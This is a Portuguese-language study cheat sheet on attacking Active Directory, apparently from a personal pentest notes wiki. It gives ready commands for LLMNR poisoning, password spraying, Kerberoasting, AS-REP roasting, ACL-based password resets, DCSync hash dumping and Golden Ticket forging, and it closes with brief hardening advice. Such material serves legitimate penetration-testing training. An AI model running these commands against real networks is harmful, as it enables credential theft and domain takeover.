# Active Directory Enumeration & Attacks

O Active Directory (AD) é a estrutura central de gerenciamento de identidades, autenticação (Kerberos e NTLM) e políticas de grupo em ambientes corporativos Windows.

---

## Suíte Essencial de Ferramentas
- **PowerView / SharpView:** Scripts em PowerShell e C# para enumeração profunda de objetos e permissões.
- **BloodHound / SharpHound:** Coleta e visualização em grafo de caminhos de ataque e relacionamentos de privilégios no AD.
- **Kerbrute:** Validação e enumeração de usuários de domínio via requisições Kerberos sem bloquear contas.
- **Impacket Suite:** `GetUserSPNs.py`, `GetNPUsers.py`, `secretsdump.py`, `psexec.py`, `wmiexec.py`, `raiseChild.py`.
- **Responder & Inveigh:** Poisoning de LLMNR/NBT-NS e mDNS.
- **Rubeus:** Ferramenta C# para interações avançadas com tickets Kerberos (TGT/TGS, AS-REP, Golden/Silver tickets).

---

## Reconhecimento Externo & Descoberta Passiva/Ativa
- **Wireshark & tcpdump:** Captura de pacotes buscando tráfego LDAP, Kerberos e solicitações de transmissão na rede.
- **Responder em Modo Passivo:** `responder -I eth0 -A` para mapear máquinas ativas sem enviar pacotes.
- **Enumeração de Usuários com Kerbrute:**
```bash
kerbrute userenum -d domain.local --dc <DC_IP> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

---

## Ataques Iniciais & Poisoning

### 1. LLMNR / NBT-NS Poisoning (Responder)
Captura de hashes NetNTLMv2 de usuários que tentam acessar recursos inexistentes na rede local:
```bash
responder -I eth0 -dwv
```
Quebra da hash NetNTLMv2 no Hashcat:
```bash
hashcat -m 5600 netntlmv2.txt /usr/share/wordlists/rockyou.txt
```

### 2. Password Spraying no Domínio
Utilização do `crackmapexec` ou `DomainPasswordSpray.ps1` com intervalo para não acionar bloqueio:
```bash
nxc smb <DC_IP> -u users.txt -p 'Fall2026!' --continue-on-success
```

---

## Enumeração de Controles de Segurança
- **Windows Defender:** `Get-MpComputerStatus`
- **AppLocker & Constrained Language Mode (CLM):** Verificar `$ExecutionContext.SessionState.LanguageMode`.
- **LAPS (Local Administrator Password Solution):** Verificar permissões de leitura do atributo `ms-MNS-HostMachinePassword` usando `LAPSToolkit.ps1`.

---

## Enumeração do AD

### A Partir do Linux
```bash
# Enumeração LDAP com windapsearch
python3 windapsearch.py -d domain.local --dc-ip <DC_IP> -u user -p pass --custom "objectClass=user"
# Coleta para o BloodHound
bloodhound-python -u user -p pass -d domain.local -dc dc.domain.local -c All
```

### A Partir do Windows
```powershell
# PowerView
Get-DomainUser
Get-DomainGroupMember -Identity "Domain Admins"
Get-DomainComputer
Get-DomainGPO
# Execução do SharpHound
.SharpHound.exe -c All --zipfilename domain_data.zip
```

---

## Vetores Principais de Ataque e Exploração

### 1. [[Kerberoasting]]
Ataque onde qualquer usuário autenticado solicita um ticket TGS para contas com SPN registrado e quebra a hash NTLM offline:
- **Via Impacket:**
```bash
GetUserSPNs.py -dc-ip <DC_IP> domain.local/user:pass -request -outputfile kerberoast.hashes
```
- **Quebra com Hashcat:**
```bash
hashcat -m 13100 kerberoast.hashes rockyou.txt
```

### 2. AS-REPRoasting
Ataque contra contas de usuários que possuem a opção "Do not require Kerberos preauthentication" ativada:
```bash
GetNPUsers.py -dc-ip <DC_IP> domain.local/ -usersfile users.txt -format hashcat -outputfile asrep.hashes
hashcat -m 18200 asrep.hashes rockyou.txt
```

### 3. Abuso de ACLs & ACEs
Exploração de permissões de Controle de Acesso no AD:
- **Permissões Críticas:**
  - `ForceChangePassword`: Permite redefinir a senha do usuário alvo.
  - `GenericAll` / `GenericWrite`: Controle total ou modificação de atributos do objeto.
  - `WriteDACL`: Permite alterar a ACL do objeto para conceder a si mesmo acesso total.
  - `AddSelf`: Adicionar a si mesmo a um grupo privilegiado.
- **Comando PowerView para Redefinir Senha:**
```powershell
Set-DomainUserPassword -Identity victim_user -AccountPassword 'NewPassword123!'
```

### 4. [[DCSync]] Attack
Abuso do protocolo DRSUAPI com as permissões `DS-Replication-Get-Changes` e `DS-Replication-Get-Changes-All` para solicitar hashes NTLM do banco [[NTDS.dit]] diretamente ao Domain Controller:
```bash
secretsdump.py -just-dc domain.local/admin_user:password@<DC_IP>
```

---

## Vulnerabilidades Críticas de AD
- **NoPac (CVE-2021-42278 & CVE-2021-42287):** Falsificação do nome de computador e requisição de ticket Kerberos para personificar o Domain Controller.
- **PetitPotam (CVE-2021-36942):** Força autenticação NTLM de um controlador de domínio contra um servidor malicioso do atacante.
- **GPP Passwords (gpp-decrypt):** Extração de senhas criptografadas em arquivos `Groups.xml` legados no SYSVOL.

---

## Domain Trusts & Escalada entre Florestas
- **Parent-Child Trusts:** Relações de confiança bidirecionais automáticas.
- **Ataque com SID History / ExtraSids (Golden Ticket):**
Injeção do SID do grupo `Enterprise Admins` do domínio pai (`S-1-5-21-...-519`) dentro do ticket TGT gerado no domínio filho:
```bash
ticketer.py -nthash <KRBTGT_HASH> -domain-sid <CHILD_SID> -extra-sids <PARENT_ENTERPRISE_ADMINS_SID> Administrator
```

---

## AD Hardening & Recomendações
- Implementar grupo **Protected Users** para contas privilegiadas.
- Desabilitar protocolos legados (LLMNR, NBT-NS, NTLMv1, SMBv1).
- Habilitar **SMB Signing** e **LDAP Channel Binding**.
- Auditorias periódicas com PingCastle, ADRecon e BloodHound.

---
*Notas relacionadas:* [[Password Attacks]], [[Shells & Payloads]], [[Pivoting]], [[Footprinting]]
